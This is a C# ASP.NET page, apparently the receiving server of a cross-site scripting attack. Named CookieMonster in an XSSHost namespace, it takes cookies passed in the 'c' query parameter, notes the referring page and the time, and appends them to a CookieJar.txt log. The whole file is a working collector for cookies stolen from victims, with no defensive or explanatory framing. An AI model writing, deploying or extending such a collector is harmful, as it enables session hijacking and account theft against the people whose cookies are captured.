using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Text;
using System.IO;

namespace XSSHost
{
    public partial class CookieMonster : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            PrepareCookie();
        }

        void PrepareCookie()
        {
            string qsCookie = Request.QueryString["c"];
            string strURL = Request.UrlReferrer == null ? string.Empty : Request.UrlReferrer.AbsoluteUri;
            string[] aryCookie;
            StringBuilder sbCookie = new StringBuilder(string.Empty);

            if (!string.IsNullOrEmpty(qsCookie))
            {
                aryCookie = qsCookie.Split(";".ToCharArray());

                sbCookie.Append("You got cookie!" + Environment.NewLine);

                if (!string.IsNullOrEmpty(strURL))
                {
                    sbCookie.Append("From: " + strURL + Environment.NewLine);
                }

                sbCookie.Append(DateTime.Now.ToLongDateString() + ' ' + DateTime.Now.ToLongTimeString() + Environment.NewLine);
                sbCookie.Append("Cookies of the day:" + Environment.NewLine);
                for (int i = 0; i < aryCookie.Length; i++)
                {

                    sbCookie.Append("Cookie #" + (i + 1).ToString() + " : ");
                    sbCookie.Append(aryCookie[i] + Environment.NewLine);
                }
                sbCookie.Append(" ------------------------------------- " + Environment.NewLine);
                StoreCookieToJar(sbCookie.ToString());
            }
        }

        void StoreCookieToJar(string strCookie)
        {
            string strFileName = Server.MapPath(@"~/App_Data/CookieJar.txt");

            //http://msdn.microsoft.com/en-us/library/system.io.file.appendtext.aspx
            if (!File.Exists(strFileName))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(strFileName))
                {
                    sw.WriteLine(strCookie);
                }
            }

            // This text is always added, making the file longer over time
            // if it is not deleted.
            using (StreamWriter sw = File.AppendText(strFileName))
            {
                sw.WriteLine(strCookie);
            }

        }
    }
}